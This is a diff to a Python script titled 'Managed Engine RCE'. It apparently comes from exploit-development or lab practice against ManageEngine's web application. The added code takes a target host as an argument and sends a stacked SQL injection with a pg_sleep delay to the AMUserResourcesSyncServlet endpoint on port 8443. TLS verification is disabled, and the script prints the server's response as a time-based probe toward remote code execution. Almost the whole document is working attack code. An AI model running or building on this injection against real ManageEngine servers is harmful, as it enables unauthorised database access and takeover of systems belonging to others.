@@ -5,20 +5,25 @@ Title: Managed Engine RCE.
 Description: An RCE for the Manged Engine Web Application via SQL.
 """
 
+import sys
 import requests
-from colorama import Fore, Back, Style
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def format_text(title, item):
-    cr = '\r\n'
-    section_break = cr + "*" * 20 + cr
-    item = str(item)
-    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
-    return text 
+def main():
+	if len(sys.argv) != 2:
+		print("(+) usage %s <target>" % sys.argv[0])
+		print ("(+) eg: %s target" % sys.argv[0])
+		sys.exit(1)
+	
+	t = sys.argv[1]
+	
+	sqli = ";select+pg_sleep(10);"
 
-proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
+					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
+	print(r.text)
+	print(r.headers)
 
-r = requests.get('https://manageengine:8443/', verify=False, proxies=proxies)
-print(format_text('r.status_code is:', r.status_code))
-print(format_text('r,headers is: ', r.headers))
-print(format_text('r.cookies is: ', r.cookies))
-print(format_text('r.text is: ', r.text))
+if __name__ == '__main__':
+	main()
